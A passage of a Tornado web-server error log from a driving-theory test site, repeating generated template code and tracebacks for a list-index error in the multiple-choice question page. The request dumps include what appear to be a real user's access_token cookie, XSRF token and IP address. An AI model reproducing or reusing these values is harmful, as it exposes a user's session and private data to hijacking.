 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505a0dd08e4c854816f4873e&answers=%5B0%5D&cursor=0&_xsrf=d58106729c2e4a039becf93ccaeb1433', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/536.25 (KHTML, like Gecko) Version/6.0 Safari/536.25', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFCVnlyVGtpTnpOcDFyR1ZzSGhUSkJFekYxSHRKbWw0UVE0bURON2pVQ0JnbU9OQ2owa2NMZVNaQ0o5VmJiazQ2THBRSEM1UEJMdEwycW9zRUZ0S3l5b2tGNVFaRFpE|1348079052|12d44822feb080fddbd8c92ffec64d3626ebf227; _xsrf=d58106729c2e4a039becf93ccaeb1433; __utma=188782963.2109519635.1347966676.1347966676.1348079037.2; __utmb=188782963.3.10.1348079037; __utmc=188782963; __utmz=188782963.1347966676.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 113.69ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505a0dd08e4c854816f4873e&answers=%5B0%5D&cursor=11&_xsrf=d58106729c2e4a039becf93ccaeb1433', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/536.25 (KHTML, like Gecko) Version/6.0 Safari/536.25', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFCVnlyVGtpTnpOcDFyR1ZzSGhUSkJFekYxSHRKbWw0UVE0bURON2pVQ0JnbU9OQ2owa2NMZVNaQ0o5VmJiazQ2THBRSEM1UEJMdEwycW9zRUZ0S3l5b2tGNVFaRFpE|1348079052|12d44822feb080fddbd8c92ffec64d3626ebf227; _xsrf=d58106729c2e4a039becf93ccaeb1433; __utma=188782963.2109519635.1347966676.1347966676.1348079037.2; __utmb=188782963.3.10.1348079037; __utmc=188782963; __utmz=188782963.1347966676.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 74.19ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
